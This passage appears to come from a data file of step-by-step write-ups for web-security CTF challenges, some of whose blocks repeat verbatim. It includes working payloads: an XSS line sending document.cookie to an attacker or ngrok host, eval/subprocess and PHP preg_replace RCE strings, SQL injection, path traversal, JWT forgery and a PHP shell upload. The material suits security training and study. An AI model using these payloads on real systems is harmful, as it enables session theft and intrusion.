    "This is a stored cross-site scripting vulnerability, where we can send a malicious script through the frontend to the database and when a user visits the '/queries' page, the server sends the malicious code to the user.",
    "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request.",
    "We use a common XSS code: '<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>' to redirect to our webpage by changing the 'document.location' and setting the 'c' argument to 'document.cookie', which contains the current page's cookies.",
    "We need an actively running server to receive this request and log the cookie. A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'. We run this server on all interfaces '0.0.0.0' on port '16361'.",
    "You can run this script anywhere that is internet accessible, port forward port '16361' or deploy on Google Cloud. But, the easiest method is to use ngrok.",
    "Create account at ngrok, download the application, and login. Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'. Ngrok will display a URL in the form 'http://<subdomain>.ngrok.io'.",
    "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'",
    "Finally, input the payload into the frontend for the application. Wait for a few seconds for the puppeteer instance to start and load the page. After this, you should see the flag in your Flask terminal and in the 'cookies.txt' file.",
    "Generate a barcode with a SQL injection that returns all rows using an online barcode generator.",
    "Upload the generated barcode to the website.",
    "Find the flag at the bottom of the returned results.",
    "Analyze the website and discover it is running on Flask",
    "Review the input form logic and notice the use of Python's eval() function",
    "Identify that eval() function is vulnerable and can be used to execute shell commands from within Python",
    "Use the Python subprocess library's getoutput() function to craft a payload to return the content of /flag/flag.txt",
    "Submit the payload (__import__('subprocess').getoutput('cat /flag/flag.txt')) through the form",
    "Receive the output displaying the flag",
    "Examine GitHub repo linked in the challenge that belongs to a user named Magpie Inc",
    "Find and analyze the source code for 'flagchecker.c' in the repo",
    "Since there's no exploit in 'flagchecker.c', explore other files in the repo",
    "Look at the GitHub Actions file 'build_flag_checker.yml' in the '.github/workflows' directory",
    "Examine 'build.sh' script referenced in the GitHub Actions file and determine that it uses the 1st command-line argument as the value assigned to a macro",
    "Examine the 'flaghash.sh' script to understand the process: it makes a cURL request to an IP address, hashes the results using MD5, and sets the cookie 'auth' to the value of 'FLAG_AUTH' from the secrets",
    "Investigate the GitHub Actions workflow runs, noting that the value of FLAG_AUTH is starred out",
    "Study the commit history, find a commit with the message 'Fix auth!!!'",
    "Investigate changes made in the 'Fix auth!!!' commit; find that the 'auth' cookie was previously set in 'gethash.sh'",
    "By using curl command with the previously hardcoded auth cookie value, successfully retrieve the flag",
    "The website is a renderer for LaTeX code; a LaTeX script can be written and the generated PDF can be seen via a provided link. The output LOG of the LaTeX rendering is also displayed.",
    "The source HTML indicates a requirement to read the flag from a file located at /sweatin/to/the/oldies/flag.txt.",
    "Given that LaTeX is turing-complete and can read files, attempt to read the required file but note that strings including the '/' symbol have been blacklisted.",
    "From the file index.html, use the LaTeX function \\StrMid from the xstring package to isolate the '/' symbol.",
    "Write a LaTeX script to build the path and read the flag using the isolated '/' symbol. The script defines sections of the path to the flag, reads index.html and isolates the '/' character, builds the path to the flag, and reads it.",
    "The LOG data returns with the flag inside.",
    "Get the flag by ensuring that `$to_check` is `0` to exploit PHP using loose comparison",
    "Create a 8 byte file that is equivalent to the the data in `cipher + 0xd34db33f` and upload it. The key will be XORed with `cipher + 0xd34db33f`. If they are equivalent then the XOR result will be zero",
    "The if statement will be `0 == 'whatever the password is'` which evaluates to true, and the flag will be echoed back",
    "Download app.py and examine the render function",
    "Determine that template injection is possible when passing things in the textbox",
    "Input {{ state.flag }} (you could also do {{ state }} and get the flag)",
    "Inspect the source code of the website",
    "Find the first part of the flag as a comment within the HTML",
    "Find the second part of the flag as a comment in the style.css file",
    "Use Dirb to look for hidden directories or files in the website",
    "Find the third part of the flag in the path academic/developers/secrets/final.txt",
    "Combine all of the parts to form the full flag submission",
    "Enter the website and encounter a login page. Type a random base username and password for the login",
    "See a page notifying about an incorrect login, and suggesting to visit recently acquired companies. Notice that one of the mentioned company names points to 'Robots.txt'",
    "Visit the robots.txt page for the site and find a message about using an unsupported browser, more specifically Internet Explorer 6.01",
    "Acquire the User-Agent string for Internet Explorer 6.01",
    "Change the browser's user agent to IE 6.01 through developer tools in the browser",
    "Reload the website page with the new user-agent and find a message containing a 'secret key' for the cookies",
    "Identify the 'secret key' for the site's cookies: flour_sugar_chocolate_and_lotsalove",
    "Obtain your current cookie by going to 'Inspect' -> 'Storage' -> 'Cookies' and get the cookie's value",
    "Decode the session data from the cookie using Base64 decoding on a site like cyberchef",
    "Identify that you need change the 'admin' field to 'true'. However, you need the secret key due to Flask's hash based on session data, timestamp, and the secret key",
    "To find the session cookie, set the session's 'admin' field to 'true' and run a script with the site's 'secret key' included",
    "Use the new session cookie to log into the site, either by intercepting an HTTP request or using a cookie editor tool",
    "Once the new cookie has been inputted, press 'login' on the login page to access the site and find the flag",
    "Find the admin.html page which is mentioned in Robots.txt or can be located through code inspection",
    "Attempt to login once the admin login page is discovered, which generates a cookie",
    "Check the cookie where the admin is set to false. Change its value to 'true' to get redirected to the flag page",
    "Inspect the webpage",
    "Navigate to the sources tab in the inspection tools and open the JavaScript file",
    "Set a breakpoint in the JavaScript file",
    "Reload the page to freeze the flag animation",
    "Identified that 'Cheap' can be bought by entering a valid credit card but purchase failed for 'flag'.",
    "Discovered a suspicious 'data' parameter in the URL during the purchase of 'flag' and 'cheap'.",
    "Identified that three successful purchases of 'cheap' gave the same prefix and the prefix changed in unsuccessful purchase.",
    "Deduced that the suffix of 'c1' and 'cp1' are same, so they probably contain information about the product name and the purchase status.",
    "Tried to decode the data contents unsuccessfully.",
    "Initiated a brute-force attack on the prefix using a Python script that combines portions of the failed and successful purchase data strings and makes HTTP GET requests to the provided URL.",
    "Successful brute-force attack provided a URL that returned the flag upon visiting.",
    "Examined the website's '.git' folder",
    "Accessed files such as '.git/HEAD'",
    "Used dumper from GitTools to inspect the git repo since directory wasn't directly browsable or clonable",
    "Inspected the 'flag.php' file and its history but found no relevant information",
    "Analyzed the source code for potential flaws",
    "Realized the asserts in 'index.php' were in strings, indicating potential 'eval' being done on the string",
    "Used the page string as '' and die(show_source('templates/flag.php')) or '' to cause the source of 'flag.php' file to be revealed",
    "Ran code using URL 'http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27'",
    "Acknowledged that one should never let user input be 'eval'ed in any way",
    "Identified that one of the admin pages 'report' was vulnerable to an SQL injection from the 'id' parameter",
    "Noticed that MySQL was being used",
    "Decided to use a UNION SELECT based query to obtain information from MySQL special tables",
    "Experienced difficulties finding the number of columns to use in the UNION SELECT due to browser extension issues",
    "Used the group_concat() function to obtain all entries in a column as a single row",
    "Ran a series of SQL queries via URL manipulation testing each column value",
    "Ran another series of SQL queries via URL manipulation to obtain table names from information_schema.tables",
    "Ran another series of SQL queries via URL manipulation to obtain column names from information_schema.columns",
    "Ran a final SQL query to retrieve the flag from the 'flag' column in the 'flag' table",
    "Identified that the login site is vulnerable to SQL injection",
    "Realized the login site has filters applied to the quotation marks",
    "Used a backslash as username and ' OR 1=1;#' as password for SQL injection to login as admin",
    "Discovered the site is also vulnerable to Local File Inclusion (LFI)",
    "Used LFI to access and display the code of the 'delete' resource",
    "Used LFI again to access and display the code of the 'flag' resource in the 'deleted' folder",
    "Identified that the flag was formed by computing the MD5 hash of the username, password and a salt",
    "Used a Python script to brute force the password",
    "Logged in again with the deduced password to get the flag",
    "Visited the challenge link which mentioned logging in via POST and using json request",
    "Used cURL command to send a POST request with 'user' and 'pass' as 'karma'",
    "Received a jwt token as response",
    "Decrypted the jwt token using jwt.io which revealed the payload to be {'user':'guest'}",
    "Checked the robots.txt file of the website and found the '/flag' endpoint",
    "Made a POST request to the /flag endpoint",
    "Received a response indicating a need for a valid jwt token",
    "Passed the earlier jwt token as parameter and received a response indicating a need for admin credentials",
    "Edited the existing jwt token's payload to {'user':'admin'} using jwt.io",
    "Passed the newly edited admin jwt token to the /flag endpoint",
    "Received the flag as response to the request with the admin jwt token",
    "Open the provided challenge link to view a login form",
    "Submit the form with any random user credentials. The website redirects to '/flag', displaying a message 'Not admin, no flag for you'",
    "Check the cookies of the webpage and find a 'token' key containing a JWT (JSON Web Token)",
    "Analyze the JWT using jwt.io",
    "Note that the token uses the RS256 algorithm, implying the requirement of a private and public key",
    "Access '/robots.txt' on the website and locate a PRIVATE KEY within the file",
    "With the private key located, create a token and apply the signature to it. The token is built using NodeJS and the 'jsonwebtoken' library. The token is signed with the 'user' payload set to 'admin', the retrieved private key, and the 'RS256' algorithm",
    "Use the newly generated token as a cookie and navigate to /flag",
    "The flag is now presented, successfully completing the CTF challenge",
    "Understood from the challenge description that it might involve a JWT key confusion attack.",
    "Logged in with a random value and inspected cookies.",
    "Found a `token` cookie and checked its value on jwt.io.",
    "Realised that the token was using RS256 algorithm.",
    "Accessed `/robots.txt` and found a public key.",
    "Concluded that a JWT confusion attack is needed, which involves changing the `Asymmetric Cipher Algorithm to Symmetric Cipher Algorithm`.",
    "Built an HMAC(HS256) token using the public key as a secret, crafting a token with 'admin' as the user.",
    "Used the crafted token as a cookie to access the /flag directory.",
    "Aquired the flag.",
    "Log in with junk value",
    "Check cookies",
    "Use jwt.io on token value",
    "Check token with jwt.io, discover it's using HS256 algorithm",
    "Because of the weak encryption, infer that it should be related to brute-forcing for secret_key",
    "Use jwt_tool with 'rockyou.txt' to brute force the token",
    "Find the secret_key 'redraider'",
    "Build a token of HS256 with secret_key 'redraider' and value of user as admin",
    "Access the /flag using the token as a cookie to get the flag",
    "Identify the source code of the web application with registration, login, and readfile functionalities",
    "Login to get a token using that token to readfile and read the `68696e742e747874` (hex decoded as hint.txt)",
    "Identify hint from the response suggesting length extension attack with password length less than 30 characters",
    "Identify that the web application is running on node.js and that `package.json` should be present on the system",
    "Use hashpumpy function to get the contents of package.json and establish that the password length is `22`",
    "Find that `node-serialize` is used in User.js for creating the user-specific `token` and that the npm package is vulnerable to node-deserialization RCE attack ",
    "Identify that the application verifies the token and then forwards it to `decrypter` function which calls the `unserialize` function, which can provide Remote Code Execution (RCE)",
    "Identify that to exploit RCE, payload needs to be signed with a valid signature which can be obtained from .env file",
    "Read .env file to get the AUTH_SECRET value",
    "Create a Python script to exploit the vulnerability and get Remote Code Execution (RCE)",
    "Use the exploit to read the /etc/flag.txt file and obtain the flag",
    "Analyzed 'http://35.207.189.79/pyserver/server.py' to find that the code seems to have a vulnerable functionality that doesn't sanitize query parameters properly",
    "Found that you need to login as an 'admin' user to get a 'token' ",
    "Found that the 'DB_SECRET' which holds the flag is stored in another table by examining the 'init_db' function",
    "Created a SQL injection payload to extract flag data from the server",
    "Communicated with the server using a complete request with the SQL injection payload to extract data",
    "Checked the server response to find the flag",
    "Access the provided URL and study the given codes on the page which are written in PHP",
    "Identify that the code is reading an HTTP header and using it to construct a file path",
    "From the PHP, realize that there’s a potential path traversal vulnerability that can be exploited",
    "Understand that even though '../' is replaced in the code, it can still be bypassed using '....//'",
    "Make several attempts to exploit the path traversal vulnerability, inputting 'Accept-Language: ....//....//....//....//flag' in the HTTP header",
    "After successful exploitation, receive in response an 'image' encoded in base64",
    "Decode the base64 string which reveals the flag '35c3_this_flag_is_the_be5t_fl4g'",
    "Analyzing the provided Python server script 'http://35.207.189.79/pyserver/server.py'.",
    "Identifying two significant functions: The first function sets specific server response headers if the request comes from '127.0.0.1', and the second function is used to proxy images.",
    "Identifying the server's functioning port and host from the Python script's main execution function.",
    "Noting that an image is necessary to exploit the service because the 'Content-Type' is strictly checked and some extensions, namely, '.jpg', '.png', and '.gif', are blacklisted in the header-setting function.",
    "Selecting an image: 'img/paperbots.svg' provided by the server that can be used for exploiting the service.",
    "Making a GET request to 'http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg' to trick the server into thinking that the request is coming from the same host.",
    "Receiving the server's response which includes the flag in the 'X-Localhost-Token' header.",
    "Analyse the challenge which involves a website that can't send double opt-in emails",
    "Realize that while a user can be registered, the 'magic code' needed to login won't be received via email",
    "Use the URL provided( 'http://35.207.189.79/api/login' ) to analyse the response of the authentication API",
    "Notice that the 'magic code' is actually present in the payload returned by the server",
    "Use the retrieved 'magic code' to complete the login on the website",
    "Identify that, after login, a cookie is mechanically set with the flag '35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS'",
    "Visited the given URL http://35.207.91.38/robots.txt and found a disallowed directory: /backup/.DS_Store",
    "Visited http://35.207.91.38/backup/.DS_Store to download a .DS_Store file.",
    "Used the script available at https://github.com/lijiejie/ds_store_exp to extract hidden data from the .DS_Store file.",
    "Found the flag in the backup/b/a/c/flag.txt file.",
    "Accessed the website http://35.207.120.163 from the challenge.",
    "Tried to submit a note with spaces and received an error message.",
    "Submitted a note using only characters from a-z and A-Z, which was accepted.",
    "Received a note ID, note PW and link to the note.",
    "Analyzed the website's HTML and found a comment indicating the source code is at /src.tgz.",
    "Downloaded and extracted the source code from /src.tgz.",
    "Studied the downloaded source code, finding 'flag.txt' can be read from an endpoint '/admin'.",
    "Found the code in 'view.php' to check the password and retrieve a note.",
    "Realized that the 'id' parameter could be manipulated because the program only casts the integer part.",
    "Created a crafted 'id' parameter '5779715767432985082/../../admin'.",
    "Confirmed the first two 'if' statements would be passed because PHP would only consider the integer part of the 'id' parameter for the cast.",
    "Ensured that the 'file_get_contents' instruction would perform an HTTP GET call to the backend endpoint '$BACKEND/get/5779715767432985082/../../admin'.",
    "Understood that this GET call would be interpreted like '$BACKEND/admin', which led to retrieving 'flag.txt'.",
    "Retrieved the flag, '35C3_M1Cr0_S3rvices_4R3_FUN!'.",
    "Access the initial webpage, which shows a PHP snippet",
    "Analyze the PHP code for potential vulnerabilities. Ignored the first 'If' statement as it was determined to be irrelevant for the challenge",
    "Found that the second 'If' statement presented an opportunity to be bypassed. Used the same value for both the 'pass' URL parameter and the User-Agent to exploit the PHP's type conversion",
    "Approached the third 'If' statement, which appeared to be difficult to bypass due to its use of a secret flag within a MD5 calculation",
    "Deduced that the value of $_[0], which is being compared in the If statement, can only be between '0' and 'f'",
    "Tested single characters, ranging from '0' to 'f', as the value for both 'pass' and the User-Agent header",
    "Identified 'b' as the character that successfully returned the flag",
    "Retrieved the flag '35c3_password_saltf1sh_30_seconds_max'",
    "Visited the challenge website",
    "Checked the source code of the homepage",
    "Found the first part of the flag 'accessdenied{1_w3nt_thr0ug' in an HTML comment",
    "Found a clue in the same comment to check 'd4rks0c1ety' page for the rest of the flag",
    "Visited 'https://codeiiest.github.io/d4rks0c1ety.html'",
    "Checked the source code of the 'd4rks0c1ety' page",
    "Found the second part of the flag '_th1s_w3bs1t3}' in an HTML comment",
    "Joined the two parts of the flag to form 'accessdenied{1_w3nt_thr0ugh_th1s_w3bs1t3}'",
    "Access the website homepage which contains a login form",
    "Analyze the browser cookies and find one named 'admin_id : 0'",
    "Change the value of 'admin_id' cookie to '1'",
    "Refresh the page to obtain the flag",
    "Analyzed the browser console and found an error 'jquery-3.3.1.min.js:2 Uncaught SyntaxError: Unexpected token {'",
    "Visited the reported portion of the JavaScript file",
    "Flag 'accessdenied{1t_w4s_h1dd3n_h3r3_594a9sd}' was found in the JavaScript file",
    "Accessed the website home page and noticed a strange message of INSTRUO team's love for cookies",
    "Analyzed the browser cookies",
    "Found a cookie with the name 'flag' and a value in Base64",
    "Decoded the Base64 cookie value to reveal the flag",
    "Understand the basics of game: The website is a game where you must click on the circle and not click on the squares, placed randomly every round, to get more than 20 clicks in 10 seconds",
    "Inspect the front-end source code: Frontend source is heavily obfuscated, but focus on the element and class names to recognize different components",
    "Inspect the back-end source code: Back-end source is given in the problem statement. Analyzing the source reveals that positions are sent to the client in a JSON array. The first position sent is the winning position",
    "Analyze HTTP traffic: Use tools such as the network tab in your browser's developer tools or Wireshark to analyze the format of request/response packets",
    "Develop your own client: Armed with information on how packets are structured and how to determine the winning position, develop a client script that can win each round of the game. The python code shown uses requests to repeatedly play the game",
    "Run script: Run your script and watch for the flag in the script's output",
    "Investigate the website mentioned in the challenge",
    "Identify possible XSS vulnerability due to challenge title",
    "Post a message with XSS attack using an `img` tag on `https://xmas.2020.chall.actf.co/post`",
    "Learn that the website returns a code identifying the posted message",
    "Send the code to the site administrator using `https://xmas.2020.chall.actf.co/report`",
    "Wait for the admin cookies to be caught by a server listening with `nc`",
    "Use the caught cookies to send request to `https://xmas.2020.chall.actf.co/admin`",
    "Receive a response with the flag embedded in the HTML content",
    "Extract the flag: `actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}`",
    "Visiting the provided URL to view the website contents",
    "Finding and downloading a file named configs.zip on the webpage",
    "Extracting the configs.zip file and analyzing the file named apache_ctf.conf",
    "Identifying a rule within the configuration file that replaces any 'secret' tags with the word 'Protected'",
    "Making a GET request to /secret.html and observing that the contents of 'secret' tags are replaced with 'Protected'",
    "Exfiltrating the original /secret.html page by making a GET request with a 'Range' HTTP header",
    "Observing within the content of the page that there is a 'secret' tag which contains the flag",
    "The challenge starts with a given URL: https://poems.asisctf.com/ directing to a website containing a list of books.",
    "Two actions are available on the website, 'an excerpt' and 'read online', with 'read online' opening link from an unrelated domain.",
    "The HTML source of the webpage contains a treasury.js file useful for understanding actions performed.",
    "The homepage is a result of an initial HTTP GET request to '/books.php?type=list'.",
    "An excerpt button on the page performs a HTTP GET request to '/books.php?type=excerpt&id=1'.",
    "The 'read online' button opens a window redirecting to a link specific for each book.",
    "An observation made was that the web application is likely to be vulnerable to SQL injection.",
    "SQL injection refers to the manipulation of a query to interact with the website's database, it's potentially detected here when the result of the book with 'id=1' prints on inputting the URL https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271.",
    "Weird error appears when URL https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%201%20%23 is used, hinting that XML is being read from a database.",
    "SQLmap, an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws, is used to retrieve information.",
    "Based on SQLmap results, one can determine that there are two databases available 'ASISCTF' and 'information_schema'.",
    "SQLmap results show that the 'ASISCTF' database has one table named 'books'.",
    "The 'books' table has two columns: 'id' and 'info' but SQLmap only displays one entry for 'id' of 1.",
    "SQLmap results showed that a '<flag>' XML element is hidden into the 'books' table but not in the book with 'id = 1'.",
    "Despite possible truncated output, the SQLmap did retrieve the flag 'ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}'.",
    "Considered the XML-related error spawned previously and the hint provided into the <flag> element talking about a '/flag' file.",
    "Understood that the application can be exploited via a XXE attack.",
    "Crafted a malicious payload and passed it via the SQL injection vulnerability using a 'UNION' operation.",
    "Triggered the XML payload on the application, leading to the remote file read operation.",
    "Constructed a payload to test the exploit.",
    "URL-encoded the payload.",
    "Created a malicious URL including the payload.",
    "Executed the URL, successfully reading the remote files.",
    "Used PHP filters to read source code via base64 encoding by creating another payload.",
    "URL-encoded the new payload.",
    "Created a new malicious URL including the new payload.",
    "Executed the new URL, resulting in a base64-encoded result.",
    "Decoded the base64 encoded result to obtain the flag.",
    "Connect to the given URL to view the source code.",
    "Examine the source code to find an 'eval' syntax used on 'warmup' GET parameter, which is strictly checked for.",
    "Research methods of bypassing this kind of checks due to restrictive checks.",
    "Strategy to attack endpoint determined: read another HTTP GET parameter (non-alphanumeric).",
    "Implement knowledge from research to craft a payload that will bypass the checks using bitwise XOR operation in PHP.",
    "Construct payload so that it will command execution of the content of another GET parameter.",
    "Test if the payload using 'phpinfo' page is operational.",
    "Complete the payload to visualize and read contents of 'flag.php'.",
    "Break down the payload: First part constructs a string representation; second part is used to perform 'file_get_contents('flag.php'); final part is used to perform variable dump (var_dump($_0)).",
    "The flag was output as a result of executing the attack.",
    "Analyze the HTML of the page to discover a JavaScript script",
    "Access the obfuscated code at http://challenges.auctf.com:30022/authentication.js",
    "Decode the initial array with base64 encoded strings in the JavaScript script",
    "Discover another endpoint: http://challenges.auctf.com:30022/hidden/nextstep.php to contact based on the decoded strings",
    "Perform a GET request to the discovered endpoint",
    "Decode the ROT13 encrypted message in the HTTP response",
    "Perform a POST request to the path provided by the decoded message",
    "Perform another POST request, this time with a 'flag' variable set based on the response",
    "Retrieve the flag from the response of the POST request",
    "Connecting to URL finds default Apache2 installation page",
    "Performing URL enumeration with 'dirb' tool identifies server directories",
    "Analyzing 'cgi-bin/' directory discovers 'scriptlet' endpoint",
    "Connecting to 'scriptlet' endpoint reveals it's running as 'www-data'",
    "Identifying 'scriptlet' as being vulnerable to Shellshock",
    "Exploiting Shellshock vulnerability to determine current user is 'www-data'",
    "Exploiting Shellshock to enumerate root directory and finding 'flag.file'",
    "Exploiting Shellshock again to print contents of 'flag.file'",
    "Identifying that 'flag.file' contains a hexadecimal representation of a GZip archive",
    "Recreating the GZip archive with the hexadecimal content using an editor",
    "Extracting 'flag.txt' from the gzip archive to reveal the flag",
    "Visited the challenge webpage and checked the webpage source",
    "Accessed 'http://challenges.auctf.com:30020/robots.txt' on the browser",
    "Researched the trivia answer 'Fear the Old Blood'",
    "Performed a HTTP GET request with a header named 'answer' containing the trivia answer 'Fear the Old Blood'",
    "Retrieved the flag in the response of the HTTP GET request",
    "Accessed the website and found out it is an online calculator",
    "Made a POST request to the server with a calculation statement",
    "Trigerred an error by submitting a malformed statement",
    "Discovered that the website is using PHP eval() function",
    "Used PHP system() function to execute commands",
    "Executed an 'id' command to get user information",
    "Listed the directory using 'ls -al' command",
    "Printed the content of the index.php file using 'cat index.php' command",
    "Discovered the flag within the content of the index.php file",
    "Accessed the website and found out it is an online calculator",
    "Made a POST request to the server with a calculation statement",
    "Trigerred an error by submitting a malformed statement",
    "Discovered that the website is using PHP eval() function",
    "Used PHP system() function to execute commands",
    "Executed an 'id' command to get user information",
    "Listed the directory using 'ls -al' command",
    "Printed the content of the index.php file using 'cat index.php' command",
    "Discovered the flag within the content of the index.php file",
    "Analyzed the webpage and discovered two strange cookies: 'frequency' and 'transmissions'",
    "Noticed 'frequency' increments with each page refresh",
    "Identified that 'transmissions' had a fixed part at the beginning and end, and variable part in the middle",
    "Understood that the variable part contained the previous char of the flag, the actual char of the flag, and the index of the actual char",
    "Wrote a Python script to retrieve all characters and compose the flag",
    "Implemented a loop in the Python script to iteratively read the transmissions",
    "Implemented a condition in the Python script to retrieve cookies from the target page",
    "Unquoted and cleaned up the cookie values within the Python script",
    "Appended unique transmission values to a list",
    "Created another loop in the Python script to compose the flag",
    "Iteratively added a character to the flag if its index matched with the desired one",
    "The script printed out the flag after successful execution",
    "Attempted to connect to the homepage but received an error of HTTP method not allowed.",
    "Tried a wrong HTTP verb which made the server return all allowed methods.",
    "Experimented with each method and found that 'POST' and 'PUT' returned a different result.",
    "Guessed that the following endpoints were present: '/circle/one/', '/two/', '/square/', '/com/seaerch/', '/vim/quit/.'",
    "For each endpoint, tried all HTTP verbs to discover the correct one to use.",
    "Received a PDF file from the '/circle/one/' endpoint.",
    "Received different responses from the '/two/' endpoint with 'PUT' and 'CONNECT' HTTP verbs.",
    "Received a PNG image from the 'CONNECT /two/' request.",
    "Received a PNG image with a crossword puzzle from the '/square/' endpoint.",
    "Determined the solution for the crossword puzzle.",
    "Received a webpage from the '/com/seaerch/' endpoint.",
    "Guessed that an 'application/x-www-form-urlencoded' parameter must be used to perform the search operation.",
    "Used the 'flag' value on the '/com/seaerch/' endpoint which provided another part of the flag.",
    "Received a message from the '/vim/quit/' endpoint that suggested using a query parameter.",
    "Passed a random value which revealed that a 'vim' command must be used.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Put together all obtained parts of the flag and was able to guess the first part of the flag that was referred to in the PDF.",
    "Combined both parts of the flag to solve the challenge.",
    "Attempted to connect to the homepage but received an error of HTTP method not allowed.",
    "Tried a wrong HTTP verb which made the server return all allowed methods.",
    "Experimented with each method and found that 'POST' and 'PUT' returned a different result.",
    "Guessed that the following endpoints were present: '/circle/one/', '/two/', '/square/', '/com/seaerch/', '/vim/quit/.'",
    "For each endpoint, tried all HTTP verbs to discover the correct one to use.",
    "Received a PDF file from the '/circle/one/' endpoint.",
    "Received different responses from the '/two/' endpoint with 'PUT' and 'CONNECT' HTTP verbs.",
    "Received a PNG image from the 'CONNECT /two/' request.",
    "Received a PNG image with a crossword puzzle from the '/square/' endpoint.",
    "Determined the solution for the crossword puzzle.",
    "Received a webpage from the '/com/seaerch/' endpoint.",
    "Guessed that an 'application/x-www-form-urlencoded' parameter must be used to perform the search operation.",
    "Used the 'flag' value on the '/com/seaerch/' endpoint which provided another part of the flag.",
    "Received a message from the '/vim/quit/' endpoint that suggested using a query parameter.",
    "Passed a random value which revealed that a 'vim' command must be used.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Put together all obtained parts of the flag and was able to guess the first part of the flag that was referred to in the PDF.",
    "Combined both parts of the flag to solve the challenge.",
    "Connected to the website and observed it has directory listing active",
    "Identified two files 'login.php' and 'login.php.bak' listed",
    "Observed that the first page displayed the message 'Not authenticated'",
    "Used 'login.php.bak' to view PHP source code",
    "Discovered that a cookie named 'otadmin' must be passed, which must follow the regex format /^{\"hash\": [0-9A-Z\"]+}$/",
    "Crafted a correct value for the cookie: {\"hash\": \"T35T\"}",
    "Examined the script and found that a hint was given if cookie value did not match MD5 hash of '$cfg_pass' variable",
    "Used crafted cookie value to print the hint, and then analysed the hint",
    "Realised that the issue may lie in a type juggling scenario in the comparison: $session_data['hash'] != strtoupper(MD5($cfg_pass))",
    "Decided to exploit this point by making an educated guess on the numbers at the beginning of the MD5 string",
    "Created a Python script to automate the trial and error process to exploit this type juggling loophole",
    "Executed the Python script and found the correct value for the cookie 'otadmin' to be {\"hash\": 389}",
    "Used the discovered cookie to reveal the flag: p4{wtf_php_comparisons_how_do_they_work}",
    "Accessed the meme generator web application",
    "Experimented with the meme generator functionality, noting the server requests",
    "Observed that the web application uses PhantomJS/2.1.1",
    "Research about PhantomJS/2.1.1 and identified a known vulnerability (CVE-2019-17221)",
    "Used the knowledge of the vulnerability to conclude that the web application potentially parses the HTML content and interpret it, implying a possibility of Cross-site Scripting (XSS)",
    "Created an XML HTTP request that references the /etc/flag.txt directory",
    "Injected the crafted payload into a request in either the top text or bottom text",
    "Submitted this payload to the meme generator",
    "Realised that the generated PDF had the flag inside",
    "Retrieved the CTF flag",
    "Accessed the meme generator web application",
    "Experimented with the meme generator functionality, noting the server requests",
    "Observed that the web application uses PhantomJS/2.1.1",
    "Research about PhantomJS/2.1.1 and identified a known vulnerability (CVE-2019-17221)",
    "Used the knowledge of the vulnerability to conclude that the web application potentially parses the HTML content and interpret it, implying a possibility of Cross-site Scripting (XSS)",
    "Created an XML HTTP request that references the /etc/flag.txt directory",
    "Injected the crafted payload into a request in either the top text or bottom text",
    "Submitted this payload to the meme generator",
    "Realised that the generated PDF had the flag inside",
    "Retrieved the CTF flag",
    "Recognize 'SSTI' in the given URL as a hint to 'Server-Side Template Injection' vulnerabilities",
    "Attempt to inject a template operation (7*7) to confirm the SSTI vulnerability",
    "Test a variety of charecte, ['%', '[', ']', '\"', '+', '_'] to bypass the template engine",
    "Use a payload to return all the subclasses",
    "Gather a list of subclasses returned as a result",
    "Identify the required (subprocess.Popen) class for the exploitation at position 407",
    "Use the identified class to execute the 'id' command remotely",
    "Use the identified class to list directory content remotely",
    "Use the identified class to read and display file content, specifically 'flag.txt'",
    "Visited the website http://easy-php.darkarmy.xyz/",
    "Visited http://easy-php.darkarmy.xyz/robots.txt and discovered '?lmao'",
    "Opened http://easy-php.darkarmy.xyz/?lmao which revealed the site's PHP code",
    " Noticed that the site's PHP code allows for the crafting of 'preg_replace'",
    " Discovered that 'preg_replace' is vulnerable to RCE (Remote Code Execution) using '/e'",
    " Triggered phpinfo() output by visiting 'http://easy-php.darkarmy.xyz/?bruh=phpinfo()&nic3=/DarkCON/e'",
    "Discovered that the 'is_payload_danger' method prevents certain functions such as 'system'",
    "Using the available 'fread' and 'fopen' functions, crafted a payload to read 'config.php'",
    "Visited 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=config.php' to execute the crafted payload",
    "Decoded the base64 response to reveal the source code of 'config.php'",
    "Used the 'glob' function to find interesting files",
    "Discovered a file named 'flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Read the file 'flag210d9f88fd1db71b947fbdce22871b57.php' using the same technique applied during reading of 'config.php'",
    "Visited 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Decoded the base64 response to reveal the challenge flag",
    "Performed basic web enumeration to identify the presence of a Git repository in the target URL (http://meme-stash.darkarmy.xyz/)",
    "Used the tool 'git-dumper' to extract and download all the contents of the Git repository from the website",
    "Inspected the 'git log' to view all previous commits in the repository",
    "Identified a suspicious commit with a message 'oops', indicating the possibility of useful information in previous commits",
    "Expected to find the flag before the suspicious commit and used 'git diff' command to check differences between that commit and its preceding commit",
    "From the 'git diff' command output, recognized prior presence of a file named 'flag.jpg' which was later removed",
    "Restored the repository to the previous commit that contained the flag ('flag.jpg') using 'git checkout' command",
    "Found the flag file 'flag.jpg' in the checkout version of the repository. The flag was 'darkCON{g1t_d4_fl4g}'",
    "Visited the website that allows file uploads",
    "Read HTML and found a comment containing PHP code to upload a file. This code also renames an uploaded file with a random name while preserving the file extension",
    "Uploaded a PHP shell which can be executed by visiting the uploaded file",
    "Ran the PHP shell, but it was unsuccessful",
    "Added phpinfo() to the code in the PHP shell to get information about the PHP configuration",
